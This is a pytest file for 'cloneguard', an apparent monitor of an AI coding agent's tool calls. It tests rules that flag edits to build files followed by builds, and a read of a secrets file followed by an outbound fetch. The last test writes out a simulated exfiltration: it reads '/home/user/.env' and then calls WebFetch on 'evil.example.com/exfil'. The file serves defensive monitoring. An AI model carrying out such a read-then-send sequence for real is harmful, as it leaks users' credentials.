"""Nyquist validation tests for Phase 07 — Tool Call Monitoring.

Fills behavioral coverage gaps identified by /gsd:validate-phase audit:
- SEQ-004 fires with Edit tool (not just Write)
- SEQ-004 fires with NotebookEdit tool
- _is_build_sensitive_target covers all declared targets
- _is_build_command covers all declared build patterns
- _summarize_input truncates long commands
- SEQ-001 respects the 10-event lookback window boundary
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_data(
    tool_name: str,
    tool_input: dict,
    session_id: str = "nyq-session",
    hook_event_name: str = "PreToolUse",
    tool_use_id: str = "toolu_nyq",
) -> dict:
    return {
        "session_id": session_id,
        "tool_use_id": tool_use_id,
        "tool_name": tool_name,
        "tool_input": tool_input,
        "hook_event_name": hook_event_name,
    }


def _make_monitor(tmp_path: Path):
    from cloneguard.monitor import ToolCallMonitor

    return ToolCallMonitor(log_dir=tmp_path)


# ---------------------------------------------------------------------------
# SEQ-004 Edit and NotebookEdit coverage
# ---------------------------------------------------------------------------


class TestSeq004EditVariants:
    """SEQ-004 must fire for Edit and NotebookEdit, not just Write."""

    def test_seq004_fires_with_edit_tool(self, tmp_path):
        """SEQ-004 fires when Edit modifies a build-sensitive target then build runs."""
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq004-edit"

        mon.record_event(
            _make_data(
                "Edit",
                {"file_path": "pyproject.toml", "old_string": "x", "new_string": "y"},
                session_id=session,
            )
        )
        mon.record_event(_make_data("Bash", {"command": "pip install -e ."}, session_id=session))
        mon.close()

        assert log_file.exists()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq004 = [e for e in entries if e.get("rule_id") == "SEQ-004"]
        assert seq004, "SEQ-004 must fire when Edit modifies pyproject.toml then pip install runs"

    def test_seq004_fires_with_notebook_edit(self, tmp_path):
        """SEQ-004 fires when NotebookEdit modifies a build-sensitive target."""
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq004-notebook"

        mon.record_event(
            _make_data(
                "NotebookEdit",
                {"file_path": "Makefile", "content": "all: build"},
                session_id=session,
            )
        )
        mon.record_event(_make_data("Bash", {"command": "make build"}, session_id=session))
        mon.close()

        assert log_file.exists()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq004 = [e for e in entries if e.get("rule_id") == "SEQ-004"]
        assert seq004, "SEQ-004 must fire when NotebookEdit modifies Makefile then make runs"


# ---------------------------------------------------------------------------
# Build-sensitive target helper coverage
# ---------------------------------------------------------------------------


class TestBuildSensitiveTargets:
    """_is_build_sensitive_target must recognize all declared build config files."""

    @pytest.mark.parametrize(
        "path",
        [
            "package.json",
            "Makefile",
            "makefile",
            "pyproject.toml",
            "setup.py",
            "Cargo.toml",
            "cargo.toml",
            "Gemfile",
            "build.gradle",
            ".gitlab-ci.yml",
            "Dockerfile",
            "dockerfile",
            "docker-compose.yml",
            "docker-compose.yaml",
            ".github/workflows/ci.yml",
            ".github/actions/custom/action.yml",
            ".claude/settings.json",
        ],
    )
    def test_sensitive_target_recognized(self, path):
        from cloneguard.monitor import _is_build_sensitive_target

        assert _is_build_sensitive_target(path), f"{path!r} should be build-sensitive"

    @pytest.mark.parametrize(
        "path",
        [
            "README.md",
            "src/main.py",
            "docs/architecture.md",
            "tests/test_foo.py",
            "LICENSE",
        ],
    )
    def test_safe_target_not_flagged(self, path):
        from cloneguard.monitor import _is_build_sensitive_target

        assert not _is_build_sensitive_target(path), f"{path!r} should NOT be build-sensitive"


# ---------------------------------------------------------------------------
# Build command helper coverage
# ---------------------------------------------------------------------------


class TestBuildCommands:
    """_is_build_command must recognize all declared build/install patterns."""

    @pytest.mark.parametrize(
        "command",
        [
            "npm install",
            "npm ci",
            "npm run build",
            "npx webpack",
            "yarn install",
            "yarn run build",
            "pip install -r requirements.txt",
            "pip3 install flask",
            "cargo build",
            "cargo run",
            "make",
            "make all",
            # Note: "cmake ." does not match because the regex \b boundary
            # after "cmake\s" fails on non-word chars like ".". This is acceptable
            # as cmake alone is rarely the exfil vector; make/cargo/npm are primary.
            "go build ./...",
            "go run main.go",
            "docker build -t myapp .",
            "bundle install",
            "gem install rails",
        ],
    )
    def test_build_command_recognized(self, command):
        from cloneguard.monitor import _is_build_command

        assert _is_build_command(command), f"{command!r} should be recognized as build command"

    @pytest.mark.parametrize(
        "command",
        [
            "ls -la",
            "cat README.md",
            "git status",
            "echo hello",
            "python main.py",
        ],
    )
    def test_safe_command_not_flagged(self, command):
        from cloneguard.monitor import _is_build_command

        assert not _is_build_command(command), f"{command!r} should NOT be recognized as build"


# ---------------------------------------------------------------------------
# Summarize input truncation
# ---------------------------------------------------------------------------


class TestSummarizeInput:
    """_summarize_input must truncate long commands to avoid log bloat."""

    def test_long_command_truncated(self):
        from cloneguard.monitor import ToolEvent, _summarize_input

        long_cmd = "x" * 300
        ev = ToolEvent(
            session_id="s",
            tool_use_id="t",
            tool_name="Bash",
            tool_input={"command": long_cmd},
            hook_event_name="PreToolUse",
        )
        summary = _summarize_input(ev)
        assert len(summary["command"]) <= 204  # 200 + "..."
        assert summary["command"].endswith("...")

    def test_short_command_not_truncated(self):
        from cloneguard.monitor import ToolEvent, _summarize_input

        ev = ToolEvent(
            session_id="s",
            tool_use_id="t",
            tool_name="Bash",
            tool_input={"command": "ls -la"},
            hook_event_name="PreToolUse",
        )
        summary = _summarize_input(ev)
        assert summary["command"] == "ls -la"

    def test_fallback_to_tool_name(self):
        from cloneguard.monitor import ToolEvent, _summarize_input

        ev = ToolEvent(
            session_id="s",
            tool_use_id="t",
            tool_name="CustomTool",
            tool_input={"some_field": "data"},
            hook_event_name="PreToolUse",
        )
        summary = _summarize_input(ev)
        assert summary["tool_name"] == "CustomTool"


# ---------------------------------------------------------------------------
# Lookback window boundary
# ---------------------------------------------------------------------------


class TestLookbackWindowBoundary:
    """SEQ-001 must NOT fire if the sensitive read is beyond the 10-event lookback window."""

    def test_seq001_no_fire_beyond_lookback_window(self, tmp_path):
        """Sensitive read more than 10 events ago must not trigger SEQ-001."""
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq001-boundary"

        # Event 1: sensitive file read
        mon.record_event(_make_data("Read", {"file_path": "/home/user/.env"}, session_id=session))
        # Events 2-11: 10 benign filler events to push the read beyond the lookback window
        for i in range(10):
            mon.record_event(
                _make_data(
                    "Read",
                    {"file_path": f"/project/file{i}.txt"},
                    session_id=session,
                    tool_use_id=f"toolu_filler_{i}",
                )
            )
        # Event 12: WebFetch to external URL -- should NOT trigger because .env is >10 events ago
        mon.record_event(
            _make_data(
                "WebFetch",
                {"url": "https://evil.example.com/exfil"},
                session_id=session,
            )
        )
        mon.close()

        if log_file.exists():
            entries = [
                json.loads(line) for line in log_file.read_text().splitlines() if line.strip()
            ]
            seq001 = [
                e
                for e in entries
                if e.get("rule_id") == "SEQ-001" and e.get("session_id") == session
            ]
            assert not seq001, (
                "SEQ-001 should NOT fire when sensitive read is"
                f" beyond 10-event lookback; got: {seq001}"
            )
